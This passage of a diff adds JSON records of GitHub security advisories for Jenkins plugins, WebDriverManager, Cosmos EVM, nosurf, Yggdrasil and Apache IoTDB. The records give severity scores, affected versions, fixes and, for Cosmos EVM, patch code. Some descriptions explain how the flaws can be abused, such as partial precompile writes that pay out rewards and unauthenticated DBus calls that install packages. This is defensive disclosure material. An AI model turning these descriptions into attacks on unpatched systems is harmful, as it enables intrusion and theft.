+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47887",
+      "https://www.jenkins.io/security/advisory/2025-05-14/#SECURITY-3548",
+      "https://github.com/jenkinsci/vmanager-plugin/pull/25",
+      "https://github.com/jenkinsci/vmanager-plugin/releases/tag/4.0.1-288.v8804b_ea_a_cb_7f",
+      "https://github.com/advisories/GHSA-rf73-97j8-9vqh"
+    ],
+    "published_at": "2025-05-14T21:31:20Z",
+    "updated_at": "2025-05-16T20:12:26Z",
+    "github_reviewed_at": "2025-05-16T14:47:41Z",
+    "nvd_published_at": "2025-05-14T21:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.plugins:vmanager-plugin"
+        },
+        "vulnerable_version_range": "< 4.0.1-288.v8804beaacb7f",
+        "first_patched_version": "4.0.1-288.v8804b_ea_a_cb_7f",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-862",
+        "name": "Missing Authorization"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+      "score": 4.3
+    },
+    "epss": {
+      "percentage": 0.00018,
+      "percentile": 0.03184
+    }
+  },
+  {
+    "ghsa_id": "GHSA-cp9r-g575-xc5f",
+    "cve_id": "CVE-2025-47888",
+    "url": "https://api.github.com/advisories/GHSA-cp9r-g575-xc5f",
+    "html_url": "https://github.com/advisories/GHSA-cp9r-g575-xc5f",
+    "summary": "Jenkins DingTalk Plugin Unconditionally Disables SSL/TLS Certificate and Hostname Validation",
+    "description": "Jenkins DingTalk Plugin 2.7.3 and earlier unconditionally disables SSL/TLS certificate and hostname validation for connections to the configured DingTalk webhooks.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/jenkinsci/dingtalk-plugin",
+    "identifiers": [
+      {
+        "value": "GHSA-cp9r-g575-xc5f",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-47888",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47888",
+      "https://www.jenkins.io/security/advisory/2025-05-14/#SECURITY-3353",
+      "https://github.com/advisories/GHSA-cp9r-g575-xc5f"
+    ],
+    "published_at": "2025-05-14T21:31:20Z",
+    "updated_at": "2025-05-16T14:48:45Z",
+    "github_reviewed_at": "2025-05-16T14:48:42Z",
+    "nvd_published_at": "2025-05-14T21:15:59Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "io.jenkins.plugins:dingding-notifications"
+        },
+        "vulnerable_version_range": "<= 2.7.3",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",
+        "score": 5.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",
+      "score": 5.9
+    },
+    "epss": {
+      "percentage": 0.00011,
+      "percentile": 0.00868
+    }
+  },
+  {
+    "ghsa_id": "GHSA-pwm3-776c-8q7q",
+    "cve_id": "CVE-2025-4641",
+    "url": "https://api.github.com/advisories/GHSA-pwm3-776c-8q7q",
+    "html_url": "https://github.com/advisories/GHSA-pwm3-776c-8q7q",
+    "summary": "BoniGarcia WebDriverManager Affected By Improper Restriction of XML External Entity Reference",
+    "description": "Improper Restriction of XML External Entity Reference vulnerability in bonigarcia webdrivermanager on Windows, MacOS, Linux (XML parsing components modules) allows Data Serialization External Entities Blowup. This vulnerability is associated with program files src/main/java/io/github/bonigarcia/wdm/WebDriverManager.java.\n\nThis issue affects webdrivermanager: from 1.0.0 before 6.1.0.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/bonigarcia/webdrivermanager",
+    "identifiers": [
+      {
+        "value": "GHSA-pwm3-776c-8q7q",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-4641",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-4641",
+      "https://github.com/bonigarcia/webdrivermanager/pull/1458",
+      "https://github.com/advisories/GHSA-pwm3-776c-8q7q"
+    ],
+    "published_at": "2025-05-14T21:31:18Z",
+    "updated_at": "2025-05-15T17:28:18Z",
+    "github_reviewed_at": "2025-05-15T17:27:58Z",
+    "nvd_published_at": "2025-05-14T19:15:53Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "io.github.bonigarcia:webdrivermanager"
+        },
+        "vulnerable_version_range": ">= 1.0.0, < 6.1.0",
+        "first_patched_version": "6.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:H/SC:H/SI:L/SA:H",
+        "score": 9.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-611",
+        "name": "Improper Restriction of XML External Entity Reference"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00055,
+      "percentile": 0.17306
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mjfq-3qr2-6g84",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-mjfq-3qr2-6g84",
+    "html_url": "https://github.com/advisories/GHSA-mjfq-3qr2-6g84",
+    "summary": "Cosmos EVM Allows Partial Precompile State Writes",
+    "description": "### Impact\nSetting lower EVM call gas allows users to partially execute precompiles and error at specific points in the precompile code without reverting the partially written state. \n\nIf executed on the distribution precompile when claiming funds, it could cause funds to be transferred to a user without resetting the claimable rewards to 0. The vulnerability could also be used to cause indeterministic execution by failing at other points in the code, halting validators.\n\nAny evmOS or Cosmos EVM chain using precompiles is affected.\n\n### Patches\nThe vulnerability was patched by wrapping each precompile execution into an atomic function that reverts any partially committed state on error.\n\n- [evmos/os](https://github.com/evmos/os) patch file: https://drive.google.com/file/d/1LfC0WSrQOqwTOW3qfaE6t8Jqf1PLVtS_/\n\nFor chains using a different file structure, you must manually apply the diff:\n\n### **In `x/evm/statedb.go`:**\n\nAdd the following function:\n```go\nfunc (s *StateDB) RevertMultiStore(cms storetypes.CacheMultiStore, events sdk.Events) {\n\ts.cacheCtx = s.cacheCtx.WithMultiStore(cms)\n\ts.writeCache = func() {\n\t\t// rollback the events to the ones\n\t\t// on the snapshot\n\t\ts.ctx.EventManager().EmitEvents(events)\n\t\tcms.Write()\n\t}\n}\n```\n\n### **In `x/evm/statedb/journal.go`:**\n\nReplace the `Revert` function with the following:\n```go\nfunc (pc precompileCallChange) Revert(s *StateDB) {\n\t// rollback multi store from cache ctx to the previous\n\t// state stored in the snapshot\n\ts.RevertMultiStore(pc.multiStore, pc.events)\n}\n```\n\n### **In `precompiles/common/precompile.go`:**\n\nChange the function signature in `HandleGasError` to:\n```go\nfunc HandleGasError(ctx sdk.Context, contract *vm.Contract, initialGas storetypes.Gas, err *error, stateDB *statedb.StateDB, snapshot snapshot) func() {\n...\n}\n```\n\nIn the `HandleGasError` function, add the following line in the switch statement in the `case storetypes.ErrorOutOfGas:` case:\n```go\nstateDB.RevertMultiStore(snapshot.MultiStore, snapshot.Events)\n```\n\nAdd the following function:\n```go\n// RunAtomic is used within the Run function of each Precompile implementation.\n// It handles rolling back to the provided snapshot if an error is returned from the core precompile logic.\n// Note: This is only required for stateful precompiles.\nfunc (p Precompile) RunAtomic(s snapshot, stateDB *statedb.StateDB, fn func() ([]byte, error)) ([]byte, error) {\n\tbz, err := fn()\n\tif err != nil {\n\t\t// revert to snapshot on error\n\t\tstateDB.RevertMultiStore(s.MultiStore, s.Events)\n\t}\n\treturn bz, err\n}\n```\n\n### **All Precompiles:**\nFinally, in each precompile, locate the `Run` function, and wrap each switch statement and return values into `p.RunAtomic`. For example:\n```go\n// Run executes the precompiled contract IBC transfer methods defined in the ABI.\nfunc (p Precompile) Run(evm *vm.EVM, contract *vm.Contract, readOnly bool) (bz []byte, err error) {\n\tctx, stateDB, snapshot, method, initialGas, args, err := p.RunSetup(evm, contract, readOnly, p.IsTransaction)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\t// This handles any out of gas errors that may occur during the execution of a precompile tx or query.\n\t// It avoids panics and returns the out of gas error so the EVM can continue gracefully.\n\tdefer cmn.HandleGasError(ctx, contract, initialGas, &err, stateDB, snapshot)()\n\n        // === WRAP HERE ===\n\treturn p.RunAtomic(snapshot, stateDB, func() ([]byte, error) {\n\t\tswitch method.Name {\n\t\t// TODO Approval transactions => need cosmos-sdk v0.46 & ibc-go v6.2.0\n\t\t// Authorization Methods:\n\t\tcase exampleCase:\n\t\t\tbz, err = p.example(ctx, evm.Origin, stateDB, method, args)\n\t\tdefault:\n\t\t\treturn nil, fmt.Errorf(cmn.ErrUnknownMethod, method.Name)\n\t\t}\n\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\n\t\tcost := ctx.GasMeter().GasConsumed() - initialGas\n\n\t\tif !contract.UseGas(cost) {\n\t\t\treturn nil, vm.ErrOutOfGas\n\t\t}\n\n\t\tif err := p.AddJournalEntries(stateDB, snapshot); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\n\t\treturn bz, nil\n\t})\n}\n```\n\n\n### Workarounds\nThere are no workarounds for chains that make use of precompiles. A coordinated upgrade is necessary to patch the issue.\n\n### Testing\nA test was introduced in the distribution precompile to ensure that partial state writes no longer occur when a lower gas amount is set.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/cosmos/evm/security-advisories/GHSA-mjfq-3qr2-6g84",
+    "source_code_location": "https://github.com/cosmos/evm",
+    "identifiers": [
+      {
+        "value": "GHSA-mjfq-3qr2-6g84",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/cosmos/evm/security/advisories/GHSA-mjfq-3qr2-6g84",
+      "https://github.com/cosmos/evm/commit/0fff8c144b24effbcb3addd666150ba5989d631c",
+      "https://drive.google.com/file/d/1LfC0WSrQOqwTOW3qfaE6t8Jqf1PLVtS_",
+      "https://github.com/advisories/GHSA-mjfq-3qr2-6g84"
+    ],
+    "published_at": "2025-05-14T17:35:54Z",
+    "updated_at": "2025-05-14T17:35:55Z",
+    "github_reviewed_at": "2025-05-14T17:35:54Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/cosmos/evm"
+        },
+        "vulnerable_version_range": "= 0.1.0",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N",
+        "score": 8.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-w9hf-35q4-vcjw",
+    "cve_id": "CVE-2025-46721",
+    "url": "https://api.github.com/advisories/GHSA-w9hf-35q4-vcjw",
+    "html_url": "https://github.com/advisories/GHSA-w9hf-35q4-vcjw",
+    "summary": "nosurf vulnerable to CSRF due to non-functional same-origin request checks",
+    "description": "### Impact\n\nThis vulnerability allows an attacker who controls content on the target site, or on a subdomain of the target site (either via XSS, or otherwise) to bypass Cross-Site Request Forgery checks and issue requests on user's behalf.\n\n### Details\n\nDue to misuse of the Go `net/http` library, nosurf categorizes all incoming requests as plain-text HTTP requests, in which case the `Referer` header is not checked to have the same origin as the target webpage.\n\nIf the attacker has control over HTML contents on either the target website (e.g. `example.com`), or on a website hosted on a subdomain of the target (e.g. `attacker.example.com`), they will also be able to manipulate cookies set for the target website. By acquiring the secret CSRF token from the cookie, or overriding the cookie with a new token known to the attacker, `attacker.example.com` is able to craft cross-site requests to `example.com`. \n\n### Patches\n\nA patch for the issue was released in nosurf 1.2.0.\n\n### Workarounds\n\nIn lieu of upgrading to a patched version of nosurf, users may additionally use another HTTP middleware to ensure that a non-safe HTTP request is coming from the same origin (e.g. by requiring a `Sec-Fetch-Site: same-origin` header in the request).\n\n### References\n\nhttps://github.com/advisories/GHSA-rq77-p4h8-4crw\nhttps://github.com/justinas/nosurf-cve-2025-46721\nhttps://www.cve.org/CVERecord?id=CVE-2025-46721\nhttps://github.com/justinas/nosurf/releases/tag/v1.2.0",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/justinas/nosurf/security-advisories/GHSA-w9hf-35q4-vcjw",
+    "source_code_location": "https://github.com/justinas/nosurf",
+    "identifiers": [
+      {
+        "value": "GHSA-w9hf-35q4-vcjw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-46721",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/justinas/nosurf/security/advisories/GHSA-w9hf-35q4-vcjw",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-46721",
+      "https://github.com/justinas/nosurf/commit/ec9bb776d8e5ba9e906b6eb70428f4e7b009feee",
+      "https://github.com/advisories/GHSA-rq77-p4h8-4crw",
+      "https://github.com/justinas/nosurf-cve-2025-46721",
+      "https://github.com/justinas/nosurf/releases/tag/v1.2.0",
+      "https://github.com/advisories/GHSA-w9hf-35q4-vcjw"
+    ],
+    "published_at": "2025-05-14T14:56:27Z",
+    "updated_at": "2025-05-14T14:56:28Z",
+    "github_reviewed_at": "2025-05-14T14:56:27Z",
+    "nvd_published_at": "2025-05-13T16:15:31Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/justinas/nosurf"
+        },
+        "vulnerable_version_range": "< 1.2.0",
+        "first_patched_version": "1.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "score": 6.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-352",
+        "name": "Cross-Site Request Forgery (CSRF)"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "patrickod",
+          "id": 84262,
+          "node_id": "MDQ6VXNlcjg0MjYy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/84262?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/patrickod",
+          "html_url": "https://github.com/patrickod",
+          "followers_url": "https://api.github.com/users/patrickod/followers",
+          "following_url": "https://api.github.com/users/patrickod/following{/other_user}",
+          "gists_url": "https://api.github.com/users/patrickod/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/patrickod/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/patrickod/subscriptions",
+          "organizations_url": "https://api.github.com/users/patrickod/orgs",
+          "repos_url": "https://api.github.com/users/patrickod/repos",
+          "events_url": "https://api.github.com/users/patrickod/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/patrickod/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.0002,
+      "percentile": 0.0384
+    }
+  },
+  {
+    "ghsa_id": "GHSA-rpg2-jvhp-h354",
+    "cve_id": "CVE-2025-3931",
+    "url": "https://api.github.com/advisories/GHSA-rpg2-jvhp-h354",
+    "html_url": "https://github.com/advisories/GHSA-rpg2-jvhp-h354",
+    "summary": "Yggdrasil Vulnerable to Local Privilege Escalation",
+    "description": "A flaw was found in Yggdrasil, which acts as a system broker, allowing the processes to communicate to other children's \"worker\" processes through the DBus component. Yggdrasil creates a DBus method to dispatch messages to workers. However, it misses authentication and authorization checks, allowing every system user to call it. One available Yggdrasil worker acts as a package manager with capabilities to create and enable new repositories and install or remove packages. \n\nThis flaw allows an attacker with access to the system to leverage the lack of authentication on the dispatch message to force the Yggdrasil worker to install arbitrary RPM packages. This issue results in local privilege escalation, enabling the attacker to access and modify sensitive system data.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/RedHatInsights/yggdrasil",
+    "identifiers": [
+      {
+        "value": "GHSA-rpg2-jvhp-h354",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-3931",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-3931",
+      "https://access.redhat.com/errata/RHSA-2025:7592",
+      "https://access.redhat.com/security/cve/CVE-2025-3931",
+      "https://bugzilla.redhat.com/show_bug.cgi?id=2362345",
+      "https://github.com/RedHatInsights/yggdrasil/commit/196d0cbea42f72e6dfecaa563681a99e9fdb4a38",
+      "https://github.com/advisories/GHSA-rpg2-jvhp-h354"
+    ],
+    "published_at": "2025-05-14T12:31:12Z",
+    "updated_at": "2025-05-15T16:06:21Z",
+    "github_reviewed_at": "2025-05-15T16:06:17Z",
+    "nvd_published_at": "2025-05-14T12:15:19Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/redhatinsights/yggdrasil"
+        },
+        "vulnerable_version_range": "<= 0.4.6",
+        "first_patched_version": null,
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-280",
+        "name": "Improper Handling of Insufficient Permissions or Privileges "
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    },
+    "epss": {
+      "percentage": 0.0002,
+      "percentile": 0.03636
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5fc3-pqf2-57cx",
+    "cve_id": "CVE-2025-26864",
+    "url": "https://api.github.com/advisories/GHSA-5fc3-pqf2-57cx",
+    "html_url": "https://github.com/advisories/GHSA-5fc3-pqf2-57cx",
+    "summary": "Apache IoTDB Discloses Sensitive Information via Log Files",
+    "description": "Exposure of Sensitive Information to an Unauthorized Actor, Insertion of Sensitive Information into Log File vulnerability in the OpenIdAuthorizer of Apache IoTDB.\n\nThis issue affects Apache IoTDB: from 0.10.0 through 1.3.3, from 2.0.1-beta before 2.0.2.\n\nUsers are recommended to upgrade to version 1.3.4 and 2.0.2, which fix the issue.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/apache/iotdb",
+    "identifiers": [
+      {
+        "value": "GHSA-5fc3-pqf2-57cx",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-26864",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-26864",
+      "https://lists.apache.org/thread/2kcjnlypppk8qjh17dpz0jvkcpn6l162",
+      "http://www.openwall.com/lists/oss-security/2025/05/14/4",
+      "https://github.com/apache/iotdb/pull/14863",
+      "https://github.com/apache/iotdb/commit/34fcaff6b72470d5ad369307dde7fae8897aea7e",
+      "https://github.com/advisories/GHSA-5fc3-pqf2-57cx"
+    ],
+    "published_at": "2025-05-14T12:31:11Z",
+    "updated_at": "2025-05-15T17:21:24Z",
+    "github_reviewed_at": "2025-05-15T17:21:23Z",
+    "nvd_published_at": "2025-05-14T11:16:28Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.iotdb:node-commons"
+        },
+        "vulnerable_version_range": ">= 0.10.0, < 1.3.4",
+        "first_patched_version": "1.3.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.iotdb:node-commons"
+        },
+        "vulnerable_version_range": ">= 2.0.1-beta, < 2.0.2",
+        "first_patched_version": "2.0.2",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:L/SA:N",
+        "score": 6.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00018,
+      "percentile": 0.03188
+    }
+  },
+  {
+    "ghsa_id": "GHSA-f4rq-f4j9-f6rm",
+    "cve_id": "CVE-2024-24780",
+    "url": "https://api.github.com/advisories/GHSA-f4rq-f4j9-f6rm",
+    "html_url": "https://github.com/advisories/GHSA-f4rq-f4j9-f6rm",
+    "summary": "Apache IoTDB Vulnerable to Remote Code Execution",
+    "description": "Remote Code Execution with untrusted URI of UDF vulnerability in Apache IoTDB. The attacker who has privilege to create UDF can register malicious function from untrusted URI.\n\nThis issue affects Apache IoTDB: from 1.0.0 before 1.3.4.\n\nUsers are recommended to upgrade to version 1.3.4, which fixes the issue.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/apache/iotdb",
+    "identifiers": [
+      {
+        "value": "GHSA-f4rq-f4j9-f6rm",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-24780",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-24780",
+      "https://lists.apache.org/thread/xphtm98v3zsk9vlpfh481m1ry2ctxvmj",
+      "http://www.openwall.com/lists/oss-security/2025/05/14/2",
+      "https://github.com/apache/iotdb/pull/14365",
+      "https://github.com/advisories/GHSA-f4rq-f4j9-f6rm"
+    ],
+    "published_at": "2025-05-14T12:31:11Z",
+    "updated_at": "2025-05-15T17:11:53Z",
+    "github_reviewed_at": "2025-05-15T17:11:52Z",
+    "nvd_published_at": "2025-05-14T11:15:47Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.iotdb:iotdb-core"
+        },
+        "vulnerable_version_range": ">= 1.0.0, < 1.3.4",
+        "first_patched_version": "1.3.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    },
+    "epss": {
+      "percentage": 0.00287,
+      "percentile": 0.51804
+    }
+  },
+  {
+    "ghsa_id": "GHSA-gp98-hfvm-2r4x",
+    "cve_id": "CVE-2025-26795",
+    "url": "https://api.github.com/advisories/GHSA-gp98-hfvm-2r4x",
+    "html_url": "https://github.com/advisories/GHSA-gp98-hfvm-2r4x",
+    "summary": "Apache IoTDB JDBC Driver Discloses Sensitive Information via Log Files",
+    "description": "Exposure of Sensitive Information to an Unauthorized Actor, Insertion of Sensitive Information into Log File vulnerability in Apache IoTDB JDBC driver.\n\nThis issue affects iotdb-jdbc: from 0.10.0 through 1.3.3, from 2.0.1-beta before 2.0.2.\n\nUsers are recommended to upgrade to version 2.0.2 and 1.3.4, which fix the issue.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/apache/iotdb",
+    "identifiers": [
+      {
+        "value": "GHSA-gp98-hfvm-2r4x",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-26795",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-26795",
+      "https://lists.apache.org/thread/bj0ytxr5wg0c4jw8xm7rhfd8ogho0r91",
+      "http://www.openwall.com/lists/oss-security/2025/05/14/3",
+      "https://github.com/advisories/GHSA-gp98-hfvm-2r4x"
+    ],
+    "published_at": "2025-05-14T12:31:11Z",
+    "updated_at": "2025-05-15T17:18:34Z",
+    "github_reviewed_at": "2025-05-15T17:18:33Z",
+    "nvd_published_at": "2025-05-14T11:16:26Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.iotdb:iotdb-jdbc"
+        },
+        "vulnerable_version_range": ">= 0.10.0, < 1.3.4",
+        "first_patched_version": "1.3.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.iotdb:iotdb-jdbc"
+        },
+        "vulnerable_version_range": ">= 2.0.1-beta, < 2.0.2",
+        "first_patched_version": "2.0.2",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:L/SA:N",
+        "score": 6.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-200",
+        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00018,
+      "percentile": 0.03188
+    }
+  }
+]
